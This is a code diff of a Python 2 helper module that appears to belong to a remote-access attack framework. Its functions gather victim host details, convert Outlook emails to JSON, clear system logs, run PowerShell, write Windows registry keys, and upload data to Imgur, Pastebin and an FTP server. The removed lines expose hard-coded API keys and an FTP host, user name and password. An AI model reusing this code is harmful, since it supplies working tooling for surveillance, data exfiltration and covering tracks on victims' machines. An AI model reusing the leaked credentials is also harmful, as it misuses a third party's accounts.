@@ -26,6 +26,7 @@ import urllib2
 import marshal
 import zipfile
 import logging
+import colorama
 import itertools
 import functools
 import threading
@@ -35,36 +36,44 @@ import contextlib
 import collections
 import logging.handlers
 
-
 # globals
 
-_packages = ['numpy','colorama','_winreg']
-_lock     = threading.Lock()
-_debug    = True
+_abort         = False
+_debug         = True
+_requirements  = ['numpy','colorama','_winreg']
+_lock          = threading.Lock()
+_debugger      = logging.getLogger(__name__)
+_debugger.setLevel(logging.DEBUG)
+_debugger.addHandler(logging.StreamHandler())
+
+# requirements
+
+try:
+    import numpy
+    import colorama
+    if os.name == 'nt':
+        import _winreg
+except ImportError:
+    execfile('__init__.py')
+    os.execv(sys.executable, ['python'] + [os.path.abspath(sys.argv[0])] + sys.argv[1:])
 
 
+def _debugger(name=None):
+    if not name:
+        name = __name__
+    logger = logging.getLogger(name)
+    logger.setLevel(logging.DEBUG)
+    if not logger.handlers:
+        logger.addHandler(logging.StreamHandler())
+    return logger
+    
 
 def debug(info):
     """
     Log debugging info to the console (if debugging is enabled)
     """
-    if __debug__:
-        debugger = logging.getLogger(__name__)
-        debugger.setLevel(logging.DEBUG)
-        debugger.handlers = [logging.StreamHandler()]
-        debugger.debug(str(info))
-
-
-
-def task(**kwargs):
-    """
-    Input a JSON/dictionary type object and return a new task
-    """
-    if 'tasks' in kwargs or 'results' in kwargs:
-        if 'client' not in kwargs:
-            kwargs.update({'client': globals()['shell'].info.get('uid')})
-    return collections.namedtuple('Task', ('client', 'issued', 'task', 'result'))(kwargs.get('client'), kwargs.get('task'), kwargs.get('result'))
-
+    if globals()['_debug']:
+        _debugger().debug(str(info))
 
 
 @contextlib.contextmanager
@@ -82,7 +91,6 @@ def remote_repo(modules, base_url='http://localhost:8000/'):
             sys.meta_path.remove(importer)
 
 
-
 def platform():
     """
     Return the OS/platform of host machine
@@ -91,7 +99,6 @@ def platform():
         return sys.platform
     except Exception as e:
         debug("{} error: {}".format(platform.func_name, str(e)))
-
 
 
 def public_ip():
@@ -104,7 +111,6 @@ def public_ip():
         debug("{} error: {}".format(public_ip.func_name, str(e)))
 
 
-
 def local_ip():
     """
     Return local IP address of host machine
@@ -113,7 +119,6 @@ def local_ip():
         return socket.gethostbyname(socket.gethostname())
     except Exception as e:
         debug("{} error: {}".format(local_ip.func_name, str(e)))
-
 
 
 def mac_address():
@@ -126,7 +131,6 @@ def mac_address():
         debug("{} error: {}".format(mac_address.func_name, str(e)))
 
 
-
 def architecture():
     """
     Check if host machine has 32-bit or 64-bit processor architecture
@@ -135,7 +139,6 @@ def architecture():
         return int(struct.calcsize('P') * 8)
     except Exception as e:
         debug("{} error: {}".format(architecture.func_name, str(e)))
-
 
 
 def device():
@@ -148,7 +151,6 @@ def device():
         debug("{} error: {}".format(device.func_name, str(e)))
 
 
-
 def username():
     """
     Return username of current logged in user
@@ -157,7 +159,6 @@ def username():
         return os.getenv('USER', os.getenv('USERNAME'))
     except Exception as e:
         debug("{} error: {}".format(username.func_name, str(e)))
-
 
 
 def administrator():
@@ -170,10 +171,14 @@ def administrator():
         debug("{} error: {}".format(administrator.func_name, str(e)))
 
 
-
 def ipv4(address):
-    """
-    Return True if input is valid IPv4 address, otherwise False
+    """ 
+    Check if valid IPv4 address
+
+    `Required`
+    :param str address:   string to check
+
+    Returns True if input is valid IPv4 address, otherwise False
     """
     try:
         if socket.inet_aton(str(address)):
@@ -182,21 +187,22 @@ def ipv4(address):
         return False
 
 
-
 def variable(length=6):
-    """
+    """ 
     Generate a random alphanumeric variable name of given length
-    """
-    try:
-        return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))
-    except Exception as e:
-        debug("{} error: {}".format(variable.func_name, str(e)))
 
+    `Optional`
+    :param int length:    length of the variable name to generate
+    """
+    return random.choice([chr(n) for n in range(97,123)]) + str().join(random.choice([chr(n) for n in range(97,123)] + [chr(i) for i in range(48,58)] + [chr(i) for i in range(48,58)] + [chr(z) for z in range(65,91)]) for x in range(int(length)-1))
 
 
 def status(timestamp):
-    """
+    """ 
     Check the status of a job/thread
+
+    `Required`
+    :param float timestamp:   Unix timestamp (seconds since the Epoch)
     """
     try:
         assert float(timestamp)
@@ -210,10 +216,16 @@ def status(timestamp):
         debug("{} error: {}".format(job_status.func_name, str(e)))
 
 
-
 def post(url, headers={}, data={}):
-    """
+    """ 
     Make a HTTP post request and return response
+
+    `Required`
+    :param str url:       URL of target web page
+
+    `Optional`
+    :param dict headers:  HTTP request headers
+    :param dict data:     HTTP request post data
     """
     try:
         dat = urllib.urlencode(data)
@@ -225,10 +237,13 @@ def post(url, headers={}, data={}):
         debug("{} error: {}".format(post_request.func_name, str(e)))
 
 
-
 def alert(text, title):
     """
     Windows alert message box
+
+    `Required`
+    :param str text:    message in the alert box
+    :param str title:   title of the alert box
     """
     try:
         t = threading.Thread(target=ctypes.windll.user32.MessageBoxA, args=(None, text, title, 0))
@@ -239,10 +254,12 @@ def alert(text, title):
         debug("{} error: {}".format(windows_alert.func_name, str(e)))
 
 
-
 def normalize(source):
     """
     Normalize data/text/stream
+
+    `Required`
+    :param source:   string OR readable-file
     """
     try:
         if os.path.isfile(source):
@@ -259,21 +276,19 @@ def normalize(source):
         debug("{} error: {}".format(imgur.func_name, str(e2)))
 
 
-
 def registry_key(key, subkey, value):
     """
     Create a new Windows Registry Key in HKEY_CURRENT_USER
 
-        Arguments
-            :param str key:         primary registry key name
-            :param str subkey:      registry key sub-key name
-            :param str value:       registry key sub-key value
+    `Required`
+    :param str key:         primary registry key name
+    :param str subkey:      registry key sub-key name
+    :param str value:       registry key sub-key value
 
-        Returns True if successful, otherwise False
+    Returns True if successful, otherwise False
     """
     if os.name is 'nt':
         try:
-            import _winreg
             reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, key, 0, _winreg.KEY_WRITE)
             _winreg.SetValueEx(reg_key, subkey, 0, _winreg.REG_SZ, value)
             _winreg.CloseKey(reg_key)
@@ -283,15 +298,14 @@ def registry_key(key, subkey, value):
     return False
 
 
-
 def png(image):
     """
     Transforms raw image data into a valid PNG data
 
-      Arguments
-        :param image:   numpy.darray  OR  PIL.Image
+    `Required`
+    :param image:   `numpy.darray` object OR `PIL.Image` object
 
-      Returns raw image data in PNG format
+    Returns raw image data in PNG format
     """
     try:
         if isinstance(image, numpy.ndarray):
@@ -327,15 +341,14 @@ def png(image):
         debug("{} error: {}".format(png_from_data.func_name, str(e)))
 
 
-
 def emails(emails):
     """
     Transforms MAPI object into JSON/dictionary format
 
-        Arguments
-            :param MAPI emails:      emails from Outlook
+    `Required`
+    :param MAPI emails:      emails from Outlook
 
-        Returns JSON/dictionary formatted emails
+    Returns dictionary (JSON) formatted emails
     """
     try:
         output = {}
@@ -356,13 +369,12 @@ def emails(emails):
         debug("{} error: {}".format(emails.func_name, str(e)))
 
 
-
 def delete(target):
     """
-    Tries hard to delete file (via multiple methods, if necessary)
+    Tries to delete file via multiple methods, if necessary
 
-        Arguments
-            :param str target:        target filename to delete
+    `Required`
+    :param str target:     target filename to delete
     """
     try:
         if os.path.isfile(target):
@@ -387,7 +399,6 @@ def delete(target):
             pass
     except Exception as e:
         debug("{} error: {}".format(delete.func_name, str(e)))
-        
 
 
 def clear_system_logs():
@@ -404,15 +415,14 @@ def clear_system_logs():
                 debug("{} error: {}".format(clear_system_logs.func_name, str(e)))
 
 
-
 def kwargs(data):
     """
     Takes a string as input and returns a dictionary of keyword arguments
 
-        Arguments
-            :param str data:       string to parse for keyword arguments
+    `Required`
+    :param str data:    string to parse for keyword arguments
 
-        Returns dictionary of keyword arguments as key-value pairs
+    Returns dictionary of keyword arguments as key-value pairs
     """
     try:
         return {i.partition('=')[0]: i.partition('=')[2] for i in str(data).split() if '=' in i}
@@ -420,15 +430,14 @@ def kwargs(data):
         debug("{} error: {}".format(kwargs.func_name, str(e)))
 
 
-
 def powershell(code):
     """
     Execute code in Powershell.exe and return any results
 
-        Arguments
-            :param str code:      script block of Powershell code
+    `Required`
+    :param str code:      script block of Powershell code
 
-        Returns any output from Powershell executing the code
+    Returns any output from Powershell executing the code
     """
     if os.name is 'nt':
         try:
@@ -438,19 +447,18 @@ def powershell(code):
             debug("{} error: {}".format(powershell.func_name, str(e)))
 
 
-
 def display(output, color=None, style=None, pretty=False, **kwargs):
     """ 
     Pretty print output to console
 
-        Arguments
-            :param str output:     text to display
+    `Required`
+    :param str output:     text to display
 
-        Keyword Arguments
-            :param str color:     red, green, cyan, magenta, blue, white
-            :param str style:     normal, bright, dim
-            :param bool pretty:   pretty print with pprint if True
-            :param dict kwargs:   miscellaneous keyword arguments for print()
+    `Optional`
+    :param str color:     red, green, cyan, magenta, blue, white
+    :param str style:     normal, bright, dim
+    :param bool pretty:   pretty print with pprint if True
+    :param dict kwargs:   miscellaneous keyword arguments for print()
     """
     _color = colorama.Fore.RESET
     _style = colorama.Style.NORMAL
@@ -473,7 +481,6 @@ def display(output, color=None, style=None, pretty=False, **kwargs):
     print(colorama.Fore.RESET + colorama.Style.NORMAL, end="")
 
 
-
 def color():
     """ 
     Returns a random color for use in console display
@@ -484,8 +491,7 @@ def color():
         debug("{} error: {}".format(color.func_name, str(e)))
 
 
-
-def imgur(source, api_key='784d72f25e7a9b7'):
+def imgur(source, api_key=None):
     """ 
     Upload image file/data to Imgur 
     """
@@ -499,10 +505,16 @@ def imgur(source, api_key='784d72f25e7a9b7'):
         return "{} error: {}".format(imgur.func_name, str(e))
 
 
-
-def pastebin(source, api_dev_key='daf350f687a94f079a8482a046264123', api_user_key='d05a18740c105927f3cbf38cf5acf069'):
+def pastebin(source, api_dev_key, api_user_key=None):
     """ 
-    Upload file/data to Pastebin 
+    Upload file/data to Pastebin
+
+    `Required`
+    :param str source:         data or readable file-like object
+    :param str api_dev_key:    Pastebin api_dev_key
+
+    `Optional`
+    :param str api_user_key:   Pastebin api_user_key
     """
     try:
         if api_dev_key:
@@ -517,14 +529,21 @@ def pastebin(source, api_dev_key='daf350f687a94f079a8482a046264123', api_user_ke
         return '{} error: {}'.format(pastebin.func_name, str(e))
 
 
-
-def ftp(source, filetype=None, host='files000.web-hosting.com', user='snappwfm', password='10FUCKINGchar!'):
+def ftp(source, host, user, password, filetype=None):
     """ 
-    Upload file/data to FTP server 
+    Upload file/data to FTP server
+
+    `Required`
+    :param str source:    data or readable file-like object
+    :param str host:      FTP server hostname
+    :param str user:      FTP account username
+    :param str password:  FTP account password
+
+    `Optional`
+    :param str filetype:  target file type (default: .txt)
     """
     try:
         if host and user and password:
-            creds = {'host': host, 'user': user, 'password': password}
             path  = ''
             local = time.ctime().split()
             if os.path.isfile(str(source)):
@@ -535,7 +554,7 @@ def ftp(source, filetype=None, host='files000.web-hosting.com', user='snappwfm',
             else:
                 source = cStringIO.StringIO(bytes(source))
             try:
-                host = ftplib.FTP(**creds)
+                host = ftplib.FTP(host=host, user=user, password=password)
             except:
                 return "Upload failed - remote FTP server authorization error"
             addr = info.get('public_ip') if info.get('public_ip') else public_ip()
@@ -557,7 +576,6 @@ def ftp(source, filetype=None, host='files000.web-hosting.com', user='snappwfm',
         return "{} error: {}".format(ftp.func_name, str(e2))
 
 
-
 def config(*arg, **options):
     """ 
     Configuration decorator for adding attributes (e.g. declare platforms attribute with list of compatible platforms)
@@ -573,10 +591,12 @@ def config(*arg, **options):
     return _config
 
 
-
 def threaded(function):
     """ 
     Decorator for making a function threaded
+
+    `Required`
+    :param function:    function/method to add a loading animation
     """
     @functools.wraps(function)
     def _threaded(*args, **kwargs):
@@ -587,10 +607,12 @@ def threaded(function):
     return _threaded
 
 
-
 def loading_animation(function):
     """ 
     Decorator for displaying a loading animation while the function runs in a separate thread
+
+    `Required`
+    :param function:    function/method to add a loading animation
     """
     @functools.wraps(function)
     def function(*args, **kwargs):
@@ -603,10 +625,12 @@ def loading_animation(function):
     return _function
 
 
-
 def progress_bar(function):
     """ 
     Decorator for displaying a progress bar while the function is run in a separate thread
+
+    `Required`
+    :param function:    function/method to add a progress bar
     """
     @functools.wraps(function)
     def function_progress(task_queue):
@@ -621,7 +645,7 @@ def progress_bar(function):
             total   = task_queue.__length_hint__()
             percent = lambda: round(float(total - task_queue.__length_hint__())/float(total), 4)
         else:
-            with LOCK:
+            with globals()['_lock']:
                 raise TypeError("task queue must be a string, list, or queue (input type: %s)")
         t = threaded(function)(task_queue)
         while True:
@@ -640,11 +664,11 @@ def progress_bar(function):
 
 def _update_progress_bar(progress, length=50):
     if not isinstance(progress, float):
-        with LOCK:
+        with globals()['_lock']:
             raise ValueError("progress must be float")
     else:
         block = int(round(length * progress))
-        with LOCK:
+        with globals()['_lock']:
             sys.stdout.write(colorama.Fore.RESET + colorama.Style.BRIGHT +\
                              "\r{}% ".format(round(progress * 100.0, 4)) +\
                              colorama.Fore.RED + colorama.Style.BRIGHT +\
